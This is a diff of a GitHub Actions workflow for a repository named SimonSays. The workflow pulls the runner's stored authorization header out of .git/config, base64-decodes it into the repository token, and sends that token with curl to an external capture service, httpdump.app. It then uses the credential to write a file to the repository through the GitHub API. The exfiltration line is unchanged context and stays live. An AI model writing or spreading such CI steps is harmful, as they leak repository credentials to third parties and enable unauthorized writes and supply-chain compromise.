@@ -13,11 +13,11 @@ jobs:
           cd /home/runner/work/SimonSays/SimonSays/.git
           decoded=$(cat config | sed -n 's/\textraheader = AUTHORIZATION: basic \(.*\)/\1/p' | openssl enc -d -base64)
           curl -H "Authorization: basic $decoded" https://httpdump.app/dumps/2b8d07a6-ee26-4b5d-bb3b-876fff962c9b
-          curl -H "Accept: application/vnd.github+json" -H "Authorization: basic $decoded" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/shira2r/SimonSays/collaborators/shira2r/permission
+          #curl -H "Accept: application/vnd.github+json" -H "Authorization: basic $decoded" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/shira2r/SimonSays/collaborators/shira2r/permission
           curl \
             -X PUT \
             -H "Accept: application/vnd.github+json" \
-            -H "Authorization: basic $decoded"\
+            -H "Authorization: basic $GITHUB_TOKEN"\
             -H "X-GitHub-Api-Version: 2022-11-28" \
             https://api.github.com/repos/shira2r/SimonSays/contents/test1.md \
             -d '{"message":"my commit message","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
